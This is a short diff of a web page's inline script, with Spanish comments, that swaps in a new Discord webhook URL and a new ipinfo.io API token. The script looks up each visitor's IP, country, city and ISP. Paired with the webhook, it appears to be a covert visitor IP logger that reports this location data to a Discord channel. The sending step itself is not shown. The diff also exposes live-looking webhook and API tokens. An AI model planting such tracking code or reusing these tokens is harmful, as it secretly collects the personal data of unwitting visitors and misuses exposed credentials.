@@ -20,11 +20,11 @@
     <!-- ANTES DE </body> -->
     <script>
     (() => {
-      const WEBHOOK = "https://discord.com/api/webhooks/1523725696646778910/wZZgrNZxSM5vyEtvwi0Cia9ACquU3Ejf7JHcfRLxQGBlRcuaDrpuHpMbn6I8zJl48Fhw";
+      const WEBHOOK = "https://discord.com/api/webhooks/1511565634893250611/G3q92QQt2AOkZvGkpQsdcc7bxt16QCOy32AqqKNigi869eZlPJvRvbtfzJ9dDMEvx8tB";
 
       async function getIPInfo() {
         try {
-          const response = await fetch("https://ipinfo.io/json?token=f87ad1c1c69033");
+          const response = await fetch("https://ipinfo.io/json?token=af50cd0324508f");
           if (!response.ok) {
             console.warn("Error en ipinfo.io:", response.status);
             return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
